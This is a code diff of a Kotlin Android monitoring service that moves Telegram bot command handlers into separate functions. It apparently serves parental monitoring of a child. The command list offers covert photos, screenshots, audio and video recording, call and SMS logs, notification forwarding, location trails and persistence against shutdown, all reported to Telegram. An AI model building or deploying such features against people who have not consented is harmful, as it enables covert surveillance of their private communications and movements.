@@ -1730,161 +1730,13 @@ class MonitoringService : Service() {
                 sendWeeklyDigest()
             }
             "/watchnomor" -> handleWatchNomorCommand(arg, privateChat)
-            "/jejak" -> {
-                val trail = trailList()
-                if (trail.isEmpty()) {
-                    sendToTelegram("👣 Jejak kosong. Lokasi tercatat tiap patroli/perintah lokasi.")
-                } else {
-                    val last = trail.takeLast(10)
-                    sendToTelegram(buildString {
-                        appendLine("👣 <b>Jejak (${trail.size} titik tersimpan, ${last.size} terakhir)</b>")
-                        for ((ts, la, lo) in last) {
-                            appendLine("${TimeFmt.short(ts)} — $la,$lo")
-                        }
-                        append("https://www.google.com/maps/dir/" + last.joinToString("/") { "${it.second},${it.third}" })
-                    })
-                }
-            }
+            "/jejak" -> handleJejakCommand()
             "/waspada" -> {
                 sendWaspada()
             }
-            "/hilang" -> {
-                val level = batteryLevel()
-                if (!ringBusy.compareAndSet(false, true)) {
-                    sendToTelegram("⏳ Sudah bunyi, tunggu selesai.")
-                    return
-                }
-                if (recordBusy.get() || recorderActive.get()) {
-                    ringBusy.set(false)
-                    sendToTelegram("⏳ Merekam jalan: bunyi dilewati, kirim lokasi + foto…")
-                } else {
-                    sendToTelegram("🚨 <b>Hilang</b>: bunyikan + lokasi + foto…")
-                    try { ringJob?.cancel() } catch (_: Exception) { }
-                    ringJob = serviceScope.launch {
-                        try {
-                            ringDevice(60)
-                        } finally {
-                            ringBusy.set(false)
-                        }
-                    }
-                }
-                val loc = try { fetchLocation(allowStale = true) } catch (_: Exception) { null }
-                if (loc != null) {
-                    val stale = isStaleFix(loc)
-                    if (!stale) {
-                        try { rememberSentLatLon(loc.latitude, loc.longitude) } catch (_: Exception) { }
-                        try { checkGeofence(loc.latitude, loc.longitude, loc.accuracy) } catch (_: Exception) { }
-                    }
-                    sendToTelegram("📍 https://maps.google.com/?q=${loc.latitude},${loc.longitude}\nBaterai: ${if (level in 0..100) "$level%" else "?"}" + fixAgeNote(loc))
-                } else {
-                    sendToTelegram("📍 Lokasi tak didapat: " + locationFailureHint() + "\nBaterai: ${if (level in 0..100) "$level%" else "?"}")
-                }
-                try { captureAndSendPhoto(reportResult = true) } catch (_: Exception) { }
-            }
-            "/jemput" -> {
-                val sub = arg.trim()
-                if (sub.equals("off", ignoreCase = true)) {
-                    preferencesManager.jemputRadiusM = 0
-                    sendToTelegram("🏠 Jemput dimatikan.")
-                } else if (sub.isEmpty() || sub.equals("status", ignoreCase = true)) {
-                    val cur = try { preferencesManager.jemputRadiusM } catch (_: Exception) { 0 }
-                    val homeReady = try { preferencesManager.homeLatE6 != Long.MIN_VALUE && preferencesManager.homeRadiusM > 0 } catch (_: Exception) { false }
-                    sendToTelegram(
-                        when {
-                            cur <= 0 -> "🏠 Jemput: mati (contoh: /jemput 500)"
-                            !homeReady -> "🏠 Jemput: tersimpan ±${cur} m, tapi TIDAK aktif — geofence /home sedang mati/kosong. Hidupkan /home dulu."
-                            else -> "🏠 Jemput: aktif ±${cur} m dari rumah (sekali bunyi)"
-                        }
-                    )
-                } else {
-                    val rad = sub.toIntOrNull()
-                    if (rad == null || rad !in 50..5000) {
-                        sendToTelegram("Cara pakai: /jemput &lt;50-5000&gt; (meter) atau /jemput off")
-                    } else if (preferencesManager.homeLatE6 == Long.MIN_VALUE || preferencesManager.homeRadiusM <= 0) {
-                        sendToTelegram("Nyalakan geofence /home dulu sebelum /jemput.")
-                    } else {
-                        preferencesManager.jemputRadiusM = rad
-                        sendToTelegram("🏠 Jemput aktif: kabari sekali saat dalam ±${rad} m rumah.")
-                    }
-                }
-            }
-            "/help", "/start" -> {
-                if (!senderOk) {
-                    sendToTelegram(
-                        buildString {
-                            appendLine("🤖 <b>Perintah</b>")
-                            appendLine("/help - daftar ini")
-                        }
-                    )
-                    return
-                }
-                sendToTelegram(
-                    buildString {
-                        appendLine("👆 <b>Ketuk tombol di bawah</b>")
-                        appendLine()
-                        appendLine("🤖 <b>Perintah</b>")
-                        appendLine("/photo - ambil foto sekarang")
-                        appendLine("/screenshot - ambil layar HP")
-                        appendLine("/camera &lt;depan|belakang&gt; - ganti kamera")
-                        appendLine("/location - kirim lokasi sekarang")
-                        appendLine("/darurat - lokasi+foto+baterai sekaligus")
-                        appendLine("/lastcalls - 5 panggilan terakhir")
-                        appendLine("/lastsms - 5 SMS terakhir")
-                        appendLine("/photointerval &lt;0-60&gt; - interval foto (0 = manual)")
-                        appendLine("/patrol &lt;on|off&gt; - patroli foto + lokasi otomatis")
-                        appendLine("/patrolinterval &lt;5-180&gt; - interval patroli")
-                        appendLine("/night &lt;on|off&gt; - sunyi 23:00-05:00")
-                        appendLine("/pause &lt;menit&gt; - jeda foto")
-                        appendLine("/battery - lihat baterai")
-                        appendLine("/status - status monitoring")
-                        appendLine("/ringkas - status+izin+antrean sekaligus")
-                        appendLine("/perms - daftar izin aplikasi")
-                        appendLine("/stop - jeda monitoring")
-                        appendLine("/resume - lanjutkan monitoring")
-                        appendLine("/notif &lt;on|off|status&gt; - teruskan notifikasi")
-                        appendLine("/syncinterval &lt;1-1440&gt; - interval sync")
-                        appendLine("/restart - restart loop monitoring")
-                        appendLine("/flush - kirim antrean sekarang")
-                        appendLine("/clearqueue - buang antrean")
-                        appendLine("/lock - kunci layar HP")
-                        appendLine("/ring [5-60] - bunyikan HP")
-                        appendLine("/ping [camera|location] - cek delay")
-                        appendLine("/record &lt;5-600&gt; - rekam audio (detik)")
-                        appendLine("/recordvideo &lt;5-180&gt; - rekam video (detik)")
-                        appendLine("/sms &lt;nomor&gt; &lt;pesan&gt; - kirim SMS")
-                        appendLine("/smsconfirm - konfirmasi SMS tertunda")
-                        appendLine("/lastnotif - notifikasi terakhir")
-                        appendLine("/version - versi app + HP")
-                        appendLine("/uptime - lama service jalan")
-                        appendLine("/alive - denyut terakhir + berapa kali dipulihkan")
-                        appendLine("/cekmati - uji anti-mati: servis dihentikan lalu lapor hasilnya")
-                        appendLine("/sembuh - pemulihan penuh: kredensial, webhook, menu, semua loop")
-                        appendLine("/layar [jam 1-24] - ringkasan pemakaian layar per aplikasi")
-                        appendLine("/kendara on|off|status - kabar kalau anak sedang berkendara (kecepatan tinggi)")
-                        appendLine("/hematdata on|off|status - tahan kirim foto/video sampai tersambung Wi-Fi")
-                        appendLine("/heartbeat &lt;1-48|0&gt; - laporan berkala masih hidup")
-                        appendLine("/contacts &lt;nama&gt; - cari kontak")
-                        appendLine("/apps [N] - daftar aplikasi")
-                        appendLine("/storage - sisa penyimpanan")
-                        appendLine("/history &lt;nomor&gt; - call+SMS per nomor")
-                        appendLine("/watch &lt;a,b|status|off&gt; - awasi kata berbahaya")
-                        appendLine("/watchnomor &lt;nomor|status|off&gt; - awasi nomor")
-                        appendLine("/home &lt;lat,lon,rad|status|off&gt; - geofence rumah")
-                        appendLine("/school &lt;lat,lon,rad|status|off&gt; - geofence sekolah")
-                        appendLine("/jampulang &lt;HH:MM|off&gt; - jam malam + cek sekolah 08–15")
-                        appendLine("/digest - ringkasan harian")
-                        appendLine("/minggu - laporan 7 hari")
-                        appendLine("/jejak - jejak lokasi hari ini")
-                        appendLine("/waspada - skor kewaspadaan 0-100")
-                        appendLine("/hilang - bunyi+lokasi+foto sekaligus")
-                        appendLine("/jemput &lt;meter|off&gt; - kabari saat dekat rumah")
-                        appendLine("/log - log galat terakhir")
-                        appendLine("/help - daftar ini")
-                        appendLine("Tanpa / juga bisa: dimana, foto, ding, kunci, baterai, bantu")
-                    },
-                    mainMenu()
-                )
-            }
+            "/hilang" -> handleHilangCommand()
+            "/jemput" -> handleJemputCommand(arg)
+            "/help", "/start" -> handleHelpCommand(senderOk)
             else -> {
                 if (!senderOk) return
                 val hint = try { suggestCommand(command) } catch (_: Exception) { null }
@@ -1894,6 +1746,164 @@ class MonitoringService : Service() {
             }
         }
     }
+
+    private suspend fun handleJejakCommand() {
+        val trail = trailList()
+        if (trail.isEmpty()) {
+            sendToTelegram("👣 Jejak kosong. Lokasi tercatat tiap patroli/perintah lokasi.")
+        } else {
+            val last = trail.takeLast(10)
+            sendToTelegram(buildString {
+                appendLine("👣 <b>Jejak (${trail.size} titik tersimpan, ${last.size} terakhir)</b>")
+                for ((ts, la, lo) in last) {
+                    appendLine("${TimeFmt.short(ts)} — $la,$lo")
+                }
+                append("https://www.google.com/maps/dir/" + last.joinToString("/") { "${it.second},${it.third}" })
+            })
+        }
+    }
+
+    private suspend fun handleHilangCommand() {
+        val level = batteryLevel()
+        if (!ringBusy.compareAndSet(false, true)) {
+            sendToTelegram("⏳ Sudah bunyi, tunggu selesai.")
+            return
+        }
+        if (recordBusy.get() || recorderActive.get()) {
+            ringBusy.set(false)
+            sendToTelegram("⏳ Merekam jalan: bunyi dilewati, kirim lokasi + foto…")
+        } else {
+            sendToTelegram("🚨 <b>Hilang</b>: bunyikan + lokasi + foto…")
+            try { ringJob?.cancel() } catch (_: Exception) { }
+            ringJob = serviceScope.launch {
+                try {
+                    ringDevice(60)
+                } finally {
+                    ringBusy.set(false)
+                }
+            }
+        }
+        val loc = try { fetchLocation(allowStale = true) } catch (_: Exception) { null }
+        if (loc != null) {
+            val stale = isStaleFix(loc)
+            if (!stale) {
+                try { rememberSentLatLon(loc.latitude, loc.longitude) } catch (_: Exception) { }
+                try { checkGeofence(loc.latitude, loc.longitude, loc.accuracy) } catch (_: Exception) { }
+            }
+            sendToTelegram("📍 https://maps.google.com/?q=${loc.latitude},${loc.longitude}\nBaterai: ${if (level in 0..100) "$level%" else "?"}" + fixAgeNote(loc))
+        } else {
+            sendToTelegram("📍 Lokasi tak didapat: " + locationFailureHint() + "\nBaterai: ${if (level in 0..100) "$level%" else "?"}")
+        }
+        try { captureAndSendPhoto(reportResult = true) } catch (_: Exception) { }
+    }
+
+    private suspend fun handleJemputCommand(arg: String) {
+        val sub = arg.trim()
+        if (sub.equals("off", ignoreCase = true)) {
+            preferencesManager.jemputRadiusM = 0
+            sendToTelegram("🏠 Jemput dimatikan.")
+        } else if (sub.isEmpty() || sub.equals("status", ignoreCase = true)) {
+            val cur = try { preferencesManager.jemputRadiusM } catch (_: Exception) { 0 }
+            val homeReady = try { preferencesManager.homeLatE6 != Long.MIN_VALUE && preferencesManager.homeRadiusM > 0 } catch (_: Exception) { false }
+            sendToTelegram(
+                when {
+                    cur <= 0 -> "🏠 Jemput: mati (contoh: /jemput 500)"
+                    !homeReady -> "🏠 Jemput: tersimpan ±${cur} m, tapi TIDAK aktif — geofence /home sedang mati/kosong. Hidupkan /home dulu."
+                    else -> "🏠 Jemput: aktif ±${cur} m dari rumah (sekali bunyi)"
+                }
+            )
+        } else {
+            val rad = sub.toIntOrNull()
+            if (rad == null || rad !in 50..5000) {
+                sendToTelegram("Cara pakai: /jemput &lt;50-5000&gt; (meter) atau /jemput off")
+            } else if (preferencesManager.homeLatE6 == Long.MIN_VALUE || preferencesManager.homeRadiusM <= 0) {
+                sendToTelegram("Nyalakan geofence /home dulu sebelum /jemput.")
+            } else {
+                preferencesManager.jemputRadiusM = rad
+                sendToTelegram("🏠 Jemput aktif: kabari sekali saat dalam ±${rad} m rumah.")
+            }
+        }
+    }
+
+    private suspend fun handleHelpCommand(senderOk: Boolean) {
+        if (!senderOk) {
+            sendToTelegram(
+                buildString {
+                    appendLine("🤖 <b>Perintah</b>")
+                    appendLine("/help - daftar ini")
+                }
+            )
+            return
+        }
+        sendToTelegram(
+            buildString {
+                appendLine("👆 <b>Ketuk tombol di bawah</b>")
+                appendLine()
+                appendLine("🤖 <b>Perintah</b>")
+                appendLine("/photo - ambil foto sekarang")
+                appendLine("/screenshot - ambil layar HP")
+                appendLine("/camera &lt;depan|belakang&gt; - ganti kamera")
+                appendLine("/location - kirim lokasi sekarang")
+                appendLine("/darurat - lokasi+foto+baterai sekaligus")
+                appendLine("/lastcalls - 5 panggilan terakhir")
+                appendLine("/lastsms - 5 SMS terakhir")
+                appendLine("/photointerval &lt;0-60&gt; - interval foto (0 = manual)")
+                appendLine("/patrol &lt;on|off&gt; - patroli foto + lokasi otomatis")
+                appendLine("/patrolinterval &lt;5-180&gt; - interval patroli")
+                appendLine("/night &lt;on|off&gt; - sunyi 23:00-05:00")
+                appendLine("/pause &lt;menit&gt; - jeda foto")
+                appendLine("/battery - lihat baterai")
+                appendLine("/status - status monitoring")
+                appendLine("/ringkas - status+izin+antrean sekaligus")
+                appendLine("/perms - daftar izin aplikasi")
+                appendLine("/stop - jeda monitoring")
+                appendLine("/resume - lanjutkan monitoring")
+                appendLine("/notif &lt;on|off|status&gt; - teruskan notifikasi")
+                appendLine("/syncinterval &lt;1-1440&gt; - interval sync")
+                appendLine("/restart - restart loop monitoring")
+                appendLine("/flush - kirim antrean sekarang")
+                appendLine("/clearqueue - buang antrean")
+                appendLine("/lock - kunci layar HP")
+                appendLine("/ring [5-60] - bunyikan HP")
+                appendLine("/ping [camera|location] - cek delay")
+                appendLine("/record &lt;5-600&gt; - rekam audio (detik)")
+                appendLine("/recordvideo &lt;5-180&gt; - rekam video (detik)")
+                appendLine("/sms &lt;nomor&gt; &lt;pesan&gt; - kirim SMS")
+                appendLine("/smsconfirm - konfirmasi SMS tertunda")
+                appendLine("/lastnotif - notifikasi terakhir")
+                appendLine("/version - versi app + HP")
+                appendLine("/uptime - lama service jalan")
+                appendLine("/alive - denyut terakhir + berapa kali dipulihkan")
+                appendLine("/cekmati - uji anti-mati: servis dihentikan lalu lapor hasilnya")
+                appendLine("/sembuh - pemulihan penuh: kredensial, webhook, menu, semua loop")
+                appendLine("/layar [jam 1-24] - ringkasan pemakaian layar per aplikasi")
+                appendLine("/kendara on|off|status - kabar kalau anak sedang berkendara (kecepatan tinggi)")
+                appendLine("/hematdata on|off|status - tahan kirim foto/video sampai tersambung Wi-Fi")
+                appendLine("/heartbeat &lt;1-48|0&gt; - laporan berkala masih hidup")
+                appendLine("/contacts &lt;nama&gt; - cari kontak")
+                appendLine("/apps [N] - daftar aplikasi")
+                appendLine("/storage - sisa penyimpanan")
+                appendLine("/history &lt;nomor&gt; - call+SMS per nomor")
+                appendLine("/watch &lt;a,b|status|off&gt; - awasi kata berbahaya")
+                appendLine("/watchnomor &lt;nomor|status|off&gt; - awasi nomor")
+                appendLine("/home &lt;lat,lon,rad|status|off&gt; - geofence rumah")
+                appendLine("/school &lt;lat,lon,rad|status|off&gt; - geofence sekolah")
+                appendLine("/jampulang &lt;HH:MM|off&gt; - jam malam + cek sekolah 08–15")
+                appendLine("/digest - ringkasan harian")
+                appendLine("/minggu - laporan 7 hari")
+                appendLine("/jejak - jejak lokasi hari ini")
+                appendLine("/waspada - skor kewaspadaan 0-100")
+                appendLine("/hilang - bunyi+lokasi+foto sekaligus")
+                appendLine("/jemput &lt;meter|off&gt; - kabari saat dekat rumah")
+                appendLine("/log - log galat terakhir")
+                appendLine("/help - daftar ini")
+                appendLine("Tanpa / juga bisa: dimana, foto, ding, kunci, baterai, bantu")
+            },
+            mainMenu()
+        )
+    }
+
+
     private suspend fun handleContactsCommand(arg: String) {
         if (arg.isEmpty()) {
             sendToTelegram("Cara pakai: /contacts &lt;nama&gt;")
